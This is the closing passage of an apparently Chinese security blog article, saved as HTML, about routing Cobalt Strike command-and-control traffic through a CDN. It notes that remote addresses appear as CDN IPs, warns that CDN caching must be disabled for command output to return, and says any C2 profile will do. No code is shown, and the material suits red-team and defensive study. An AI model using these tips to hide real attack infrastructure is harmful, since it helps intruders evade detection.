onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9MbeMJmpR2cicGhCqqvT1ZAd4hfCCF2c7LCZx2S8tF74bAObWdxLtE1NbQg3dpzCx3nSf7BWicRjjA/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p><span style="font-size:16px;line-height:36px;;">远端地址均为CDN IP</span><span style="text-align: center;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"></span></p><p><span style="text-align: center;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><br  /></span></p><p><strong style="font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;color: rgb(255, 104, 39);">0X02&nbsp;&nbsp;&nbsp;&nbsp;需要注意的坑</strong><span style="font-size:16px;line-height:36px;;"></span></p><p><span style="color: rgb(255, 104, 39);"><strong><br  /></strong></span></p><p>CDN需要关闭缓存或开启开发模式,如果不关闭缓存，会出现执行命令，回不来返回内容以及机器超时。</p><p><img class="rich_pages js_insertlocalimg" data-ratio="0.5858585858585859" data-s="300,640" src="图片/HACK学习呀_2020-08-25_CS如何配置通过CDN上线/5_lbzPdZLzqmgeIUzORgKWePseiaDRXg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9MbeMJmpR2cicGhCqqvT1ZAQEWk1WH4c9AFkEdGfoqEbE6dTlbzPdZLzqmgeIUzORgKWePseiaDRXg/640?wx_fmt=png'" data-type="png" data-w="1089" style="text-align: center;white-space: normal;"  /></p><p><img src="图片/HACK学习呀_2020-08-25_CS如何配置通过CDN上线/6_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" data-type="png" data-ratio="0.109375" data-w="640"  /></p><p style="text-align: center;"><strong><span style="font-size:18px;line-height:38px;;color: rgb(255, 104, 39);">点赞，转发，在看</span></strong></p><p style="text-align: center;"><strong><span style="font-size:18px;line-height:38px;;color: rgb(255, 104, 39);"><br  /></span></strong></p><p style="text-align: center;"><span style="font-size:16px;line-height:36px;;color: rgb(0, 0, 0);"><strong>C2配置文件，可以用其他的也可以，并不局限于文中的C2.profile</strong></span></p><p style="text-align: center;"><strong><span style="font-size:18px;line-height:38px;;color: rgb(255, 104, 39);"><br  /></span></strong></p><p style="text-align: right;"><span style="color: rgb(136, 136, 136);font-size:13px;line-height:33px;;">原创投稿作者：Sp4ce</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2020-08-25_CS如何配置通过CDN上线/7_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style=""  /><strong style="font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"></strong></p>
                </div>
</div>
</body>
</html>